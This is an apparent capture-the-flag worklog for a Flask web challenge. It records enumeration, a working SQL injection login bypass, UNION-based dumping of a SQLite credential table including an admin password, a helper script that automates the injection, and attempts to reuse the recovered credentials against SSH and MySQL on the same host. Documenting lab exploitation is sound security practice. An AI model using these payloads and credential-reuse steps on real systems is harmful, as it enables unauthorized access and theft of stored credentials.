# Kihansi Breach - Full Worklog

Date: 2026-04-04  
Target: `209.38.92.205:33132`  
Expected flag format: `GoH{...}`

## Scope Summary
- Initial foothold achieved via SQL injection on `/login`.
- Hidden engineering panel `/engineering` discovered and accessed.
- Full SQLite data exfiltration from backend auth DB achieved via UNION-based SQLi.
- Valid operator credentials (including admin) recovered.
- No confirmed `GoH{...}` flag recovered yet from current data sources.

---

## 1) Initial Enumeration

### Key requests
```bash
curl -i http://209.38.92.205:33132/
curl -i http://209.38.92.205:33132/login
curl -i http://209.38.92.205:33132/dashboard
curl -i http://209.38.92.205:33132/robots.txt
curl -i http://209.38.92.205:33132/sitemap.xml
```

### Findings
- `/` -> `302` to `/login`
- `/dashboard` unauthenticated -> `302` to `/login`
- App stack indicators: Gunicorn + Flask-style sessions/templates
- Custom 404 page (`Content-Length: 1085`) for missing routes

---

## 2) Auth Bypass (Primary Vulnerability)

### Working payload
```text
username=' or '1'='1
password=' or '1'='1
```

### Result
- Login returns `302 /dashboard`
- Session cookie issued and decodes to valid user context:
```json
{"badge_id":"TGP-001","full_name":"Amara Njau","role":"engineer","user_id":1,"username":"amara.njau"}
```

### Vulnerability class
- SQL Injection (authentication bypass) in `/login`.

---

## 3) Hidden Endpoint Discovery

From dashboard HTML comment:
```html
<!-- Engineering diagnostic panel available at /engineering — restricted to TGP engineering staff -->
```

### Endpoint behavior
- `/engineering` accessible after auth
- Contains form:
  - `POST /engineering/read`
  - `start_address` (int)
  - `count` (int)

### `/engineering/read` responses observed
- Non-integer payloads -> `Invalid input. Enter integer values for address and count.`
- `start_address < 0` or `> 9900` -> `Address out of range. Valid range: 0 to 9900.`
- Most valid integer combinations -> `PLC communication failure. Check network and PLC status.`
- Repeated retries (30 attempts) on `start_address=100&count=20` remained PLC failure.

---

## 4) SQLi UNION Exploitation (Data Exfiltration)

## 4.1 Column count discovery
- Tested `UNION SELECT NULL,...` from 1..12 columns.
- Only **7 columns** produced successful login (`302 /dashboard`).

## 4.2 Session field mapping (UNION column -> session key)
Payload:
```sql
' UNION SELECT 111,'col2','col3','col4','col5','col6','col7'-- -
```
Decoded session:
```json
{"badge_id":"col7","full_name":"col4","role":"col5","user_id":111,"username":"col2"}
```

Mapping:
- col1 -> `user_id`
- col2 -> `username` (main exfil channel)
- col4 -> `full_name`
- col5 -> `role`
- col7 -> `badge_id`

## 4.3 DB fingerprinting
- `sqlite_version()` -> `3.46.1`
- `pragma_database_list` -> `main:/tmp/tanzagrid.db`
- Tables -> `operators|sqlite_sequence|event_log`

## 4.4 Schema dump
- `operators(id, username, password, full_name, role, shift, badge_id)`
- `event_log(id, timestamp, severity, source, description)`

## 4.5 Full operator credential dump (critical)
Recovered all rows from `operators` via SQLi exfil.

Notable credentials:
- `admin : TGP@dm1n2024`
- `ops.monitor : OpsM0n!24`
- Plus all operator/engineer/supervisor accounts.

## 4.6 Admin login confirmed
```bash
username=admin
password=TGP@dm1n2024
```
- Successful auth (`302 /dashboard`)
- Session role displays `ADMIN` (`TGP-ADM`)
- UI/route surface remained same as normal authenticated users.

---

## 5) Additional Technical Probing

## 5.1 SQLite functions/modules
From SQLi-exfiltrated metadata:
- Functions include `load_extension`, `hex`, `unhex`, etc.
- Modules include `sqlite_dbpage`, `dbstat`, `fts5`, `rtree`, etc.

### load_extension tests
- Attempts to load common extension paths all returned app-level DB error (`Authentication service unavailable`) and did not produce a usable file-read primitive.

## 5.2 Raw page scanning
- `pragma_page_count` = `5`
- Searched raw SQLite pages (`sqlite_dbpage`) for `goh` and `GoH{` patterns:
  - `goh` -> none
  - `GoH{` byte signature -> none
- Searching `flag` matched page `5` only (consistent with log text phrase "momentary flag").

## 5.3 Route fuzzing / manual endpoint guesses
- Manual route tests and targeted path sweep yielded only known pages + custom 404.
- No additional authenticated hidden routes confirmed in current probing.

## 5.4 Other open host ports
Quick probe on host showed:
- `33132/tcp` challenge web app
- `80/tcp` nginx default page (appears unrelated)
- `3306/tcp` MySQL handshake reachable (`5.7.44`), but tested creds denied from current source host.

---

## 6) Tooling Added in This Folder

### `sqli_helper.py`
Path:
- `kihansi_breach/sqli_helper.py`

Purpose:
- Automates SQLi expression injection in login.
- Captures non-redirect login response headers.
- Decodes Flask session and prints exfiltrated `username` value.

Usage:
```bash
python3 kihansi_breach/sqli_helper.py --expr "sqlite_version()"
python3 kihansi_breach/sqli_helper.py --expr "(SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table')"
python3 kihansi_breach/sqli_helper.py --expr "(SELECT group_concat(id||':'||username||':'||password,'||') FROM operators)"
```

---

## 7) Current Status

### Confirmed
- SQLi auth bypass is real and reliable.
- UNION-based data exfiltration from SQLite is real and reliable.
- Admin creds recovered and validated.

### Not yet recovered
- Final flag value in format `GoH{...}` is still not located from:
  - visible DB rows (`operators`, `event_log`)
  - quick raw DB page keyword scans
  - normal authenticated web routes

### Most likely remaining path candidates
1. A not-yet-hit hidden endpoint/action not visible in current templates.
2. PLC/backend dependency behind `/engineering/read` that never came online during this run.
3. Flag storage outside accessible SQLite rows and outside current exposed route set.

---

## 8) Continuation Run (New Instance Port)

Date: 2026-04-04  
Updated target: `209.38.92.205:33135`

### 8.1 Re-validation on `33135`
- App fingerprint unchanged (`gunicorn`, same login/dashboard templates).
- SQLi still works exactly as before.
- UNION shape remains `7` columns with same session mapping.
- DB contents still showed:
  - tables: `operators|sqlite_sequence|event_log`
  - `admin:TGP@dm1n2024`
  - same 25 `event_log` entries

### 8.2 Engineering panel behavior
- `/engineering` still exposed after auth.
- `/engineering/read` behavior remained consistent:
  - valid integer ranges -> `PLC communication failure` (body length `4857`)
  - out-of-range -> `Address out of range` (body length `4846`)
- Multiple retries and range/count sweeps did not yield a successful PLC data response.

### 8.3 Discovery/fuzzing on new instance
- GET route fuzzing (normal + forged admin session) returned only known routes:
  - `login`, `logout`, `dashboard`, `alarms`, `reports`, `engineering`, `engineering/read`
- No additional hidden web endpoints confirmed on `33135`.
- Static assets (`/static/js/app.js`, CSS, templates) contained no extra API endpoints or hidden clues.

### 8.4 Raw SQLite page re-check
- Re-extracted `sqlite_dbpage` pages on new instance (`page_count=5`).
- No `GoH{...}` marker in printable/raw page content.
- Only expected strings found (users, event text including "momentary flag" wording).

### 8.5 Host-level side checks
- Open ports observed: `80`, `2222`, `3306`, `7000`, `8084`, `33135`.
- `7000` and `8084` served unrelated web apps.
- SSH (`2222`) rejected recovered app creds.
- MySQL (`3306`) denied tested recovered creds and common defaults.

### 8.6 Current continuation conclusion
- New port migration did not change the core exploitable web behavior.
- We still have reliable SQLi + full auth DB exfiltration, but no final flag yet.
- Most probable unresolved path is still a backend/PLC success condition or a route/action not currently reachable/active.
